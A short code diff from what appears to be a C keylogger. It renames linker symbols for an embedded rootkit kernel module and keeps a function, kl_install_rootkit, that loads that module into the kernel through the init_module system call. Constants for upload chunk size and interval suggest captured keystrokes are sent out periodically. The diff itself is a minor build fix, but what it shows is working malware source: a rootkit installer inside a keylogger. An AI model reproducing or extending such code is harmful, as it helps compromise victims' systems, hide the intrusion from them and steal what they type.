@@ -32,15 +32,15 @@ const size_t KL_UPLOAD_CHUNK_MAX_LEN = 4096;
 const uint16_t KL_UPLOAD_INTERVAL_SECS = 10;
 
 // Contains the ELF image of the rootkit
-extern uint8_t _binary_bin_rooti_ko_start[];
-extern uint8_t _binary_bin_rooti_ko_end[];
+extern uint8_t _binary_rooti_ko_start[];
+extern uint8_t _binary_rooti_ko_end[];
 
 
 void kl_install_rootkit()
 {
-    size_t image_size = _binary_bin_rooti_ko_end - _binary_bin_rooti_ko_start;
+    size_t image_size = _binary_rooti_ko_end - _binary_rooti_ko_start;
 
-    int err = syscall(SYS_init_module, _binary_bin_rooti_ko_start, image_size, "");
+    int err = syscall(SYS_init_module, _binary_rooti_ko_start, image_size, "");
     if (err) {
         perror("keylogger");
         exit(EXIT_FAILURE);
